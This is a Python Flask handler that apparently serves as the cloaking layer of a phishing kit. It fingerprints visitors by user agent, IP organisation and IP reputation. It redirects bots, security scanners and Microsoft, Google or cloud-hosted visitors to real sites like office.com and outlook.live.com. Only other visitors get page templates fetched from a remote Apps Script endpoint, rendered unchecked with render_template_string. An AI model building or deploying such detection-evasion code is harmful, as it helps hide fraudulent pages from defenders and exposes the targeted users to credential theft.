import requests
import json
import random
import re
import time
from flask import render_template_string, request, redirect
from dotenv import load_dotenv
import os
import logging

logger = logging.getLogger(__name__)

load_dotenv()

class PageTemplateHandler:
    def __init__(self):
        self.APPSCRIPT_URL = os.getenv('APPSCRIPT_URL')
        self.FLAGGED_IPS = set()
        self.LEGITIMATE_DOMAINS = [
            "https://www.google.com",
            "https://www.office.com",
            "https://outlook.live.com",
            "https://www.microsoft.com",
            "https://www.bing.com",
            "https://www.yahoo.com"
        ]
        self.IPHUB_API_KEY = os.getenv('IPHUB_API_KEY')
        self.ABUSEIPDB_API_KEY = os.getenv('ABUSEIPDB_API_KEY')

    def is_bot_or_org(self, ip, user_agent, org_info):
        org_keywords = ['microsoft', 'google', 'amazon', 'digital ocean', 'azure',
                       'aws', 'oracle', 'facebook', 'twitter', 'linkedin']
        
        bot_patterns = [
            r'bot', r'crawler', r'spider', r'slurp', r'mediapartners',
            r'googleapis', r'chrome-lighthouse', r'pingdom', r'pagespeed'
        ]
        
        user_agent = user_agent.lower()
        org_info = org_info.lower() if org_info else ""
        
        if any(re.search(pattern, user_agent) for pattern in bot_patterns):
            return True
            
        if any(keyword in org_info for keyword in org_keywords):
            return True
            
        return False

    def is_ip_flagged(self, ip):
        if ip in self.FLAGGED_IPS:
            return True

        try:
            headers = {"X-Key": self.IPHUB_API_KEY}
            response = requests.get(f"https://v2.api.iphub.info/ip/{ip}", headers=headers)
            if response.status_code == 200 and response.json().get("block", 0) == 1:
                self.FLAGGED_IPS.add(ip)
                return True

            headers = {"Key": self.ABUSEIPDB_API_KEY, "Accept": "application/json"}
            response = requests.get(f"https://api.abuseipdb.com/api/v2/check?ipAddress={ip}", headers=headers)
            if response.status_code == 200 and response.json().get("data", {}).get("abuseConfidenceScore", 0) > 50:
                self.FLAGGED_IPS.add(ip)
                return True
        except Exception as e:
            logger.error("Error checking IP: %s", e)

        return False

    def verify_page_visit(self, complete_url, path):
        try:
            start_time = time.time()
            headers = {
                'Content-Type': 'application/x-www-form-urlencoded'
            }
            payload = {
                'action': 'verifyPageVisit',
                'completeUrl': complete_url,
                'path': path,
                'key': os.getenv('SCRIPT_KEY'),
                'ipData': request.remote_addr
            }
            response = requests.post(self.APPSCRIPT_URL, headers=headers, data=payload)
            elapsed = int((time.time() - start_time) * 1000)
            logger.info("verify_page_visit path=%s status=%s in %dms", path, response.status_code, elapsed)
            if response.status_code != 200:
                return {
                    'success': False,
                    'error': f'Server error: {response.status_code}'
                }
            if not response.text or not response.text.strip():
                return {
                    'success': False,
                    'error': 'Empty response from server'
                }
            data = response.json()
            if data.get('success'):
                code_len = len(data.get('templateCode') or '')
                logger.info("verify_page_visit path=%s SUCCESS templateCodeLen=%s", path, code_len)
                return {
                    'success': True,
                    'templateCode': data.get('templateCode'),
                    'status': data.get('status', 'active')
                }
            logger.warning("verify_page_visit path=%s FAILED error=%s", path, data.get('error', 'unknown'))
            return {
                'success': False,
                'error': data.get('error', 'Invalid response from server')
            }
        except Exception as e:
            logger.error("Exception in verify_page_visit: %s", str(e))
            return {
                'success': False,
                'error': str(e)
            }

    def handle_page_template(self, path):
        start_time = time.time()
        visitor_ip = request.remote_addr
        user_agent = request.headers.get('User-Agent', '')
        logger.info("handle_page_template path=%s ip=%s ua=%s", path, visitor_ip, user_agent[:80])
        
        try:
            ip_info = requests.get(f'https://ipinfo.io/{visitor_ip}/json').json()
            org_info = ip_info.get('org', '')
            logger.info("handle_page_template path=%s ipinfo org=%s", path, org_info)
            
            if self.is_bot_or_org(visitor_ip, user_agent, org_info):
                logger.info("handle_page_template path=%s BOT/ORG detected, redirecting", path)
                return redirect(random.choice(self.LEGITIMATE_DOMAINS)), None
                
        except Exception as e:
            logger.error("Error checking IP info: %s", e)

        if not user_agent or "bot" in user_agent.lower() or "crawler" in user_agent.lower():
            logger.info("handle_page_template path=%s BLOCKED: bot UA", path)
            return None, "Access denied: Suspicious activity detected"

        if self.is_ip_flagged(visitor_ip):
            logger.info("handle_page_template path=%s BLOCKED: flagged IP", path)
            return None, "Access denied: Suspicious activity detected"

        try:
            complete_url = request.url
            page_data = self.verify_page_visit(complete_url, path)
            
            if not page_data['success']:
                logger.warning("handle_page_template path=%s FAILED verifyPageVisit: %s", path, page_data.get('error'))
                return None, page_data['error']

            logger.info("handle_page_template path=%s RENDER ok total=%dms", path, int((time.time() - start_time) * 1000))
            return render_template_string(page_data['templateCode']), None
            
        except Exception as e:
            return None, f"Error processing template: {str(e)}"
